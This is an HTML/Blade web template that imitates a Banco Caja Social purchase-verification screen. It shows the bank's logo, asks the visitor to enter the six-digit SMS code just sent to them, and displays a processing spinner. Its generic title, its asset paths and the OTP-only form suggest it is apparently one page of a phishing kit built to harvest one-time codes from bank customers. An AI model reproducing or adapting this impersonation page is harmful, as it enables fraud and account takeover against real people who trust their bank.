<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>Document</title>
    <link rel="stylesheet" href="{{asset('assets/css/payment/cajasocial.css')}}">

    <style>
        .spinner-container {
        margin-bottom: 2rem;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(232, 17, 75, 0.2);
            border-left: 4px solid rgb(232, 17, 75);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 3rem;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>
</head>
<body>
    <div id="formContainer" class="details" style="padding: 3px;">
        <br>
        <img src="{{asset('assets/img/payment/cajasocial/cajasocialogo.jpg')}}" alt="" width="70px">
        <hr>

        <h3 style="color:black;">Vamos a validar tu compra</h3>
        <a style="color:black;">Ingresa el código SMS que te acabamos de enviar y dale "Confirmar".</a><br><p></p>
    
        
        <center><a style="">Código de verificación</a><br>
        <input type="tel" class="pass" name="cDinamica" id="txtOTP" style="" required maxlength="6" minlength="6" oninput="this.value = this.value.replace(/\D+/g, '');" required><br>
        <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:189px;"></center><br><br>
    <center><a><b>REENVIAR CÓDIGO</b></a></center><br>
    <a><b>Ayuda</b></a>
    </div>


<div id="loader" class="spinner-container" style="display:none; text-align:center; margin-top:50%;">
    <div class="spinner"></div>
    <p style="color:#333; margin-top:15px;">Procesando, por favor espera...</p>
</div>

</body>


</html>